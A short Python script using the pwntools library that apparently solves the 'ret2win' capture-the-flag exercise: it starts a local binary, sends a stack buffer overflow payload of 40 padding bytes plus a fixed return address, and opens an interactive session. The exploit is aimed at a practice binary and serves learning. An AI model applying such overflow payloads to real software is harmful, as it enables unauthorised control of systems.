from pwn import*

p = process("./ret2win")
#gdb.attach(p, api=True)

ret2win = 0x0000000000400756
payload = b'a'*40 + p64(ret2win)

p.sendline(payload)
p.interactive()
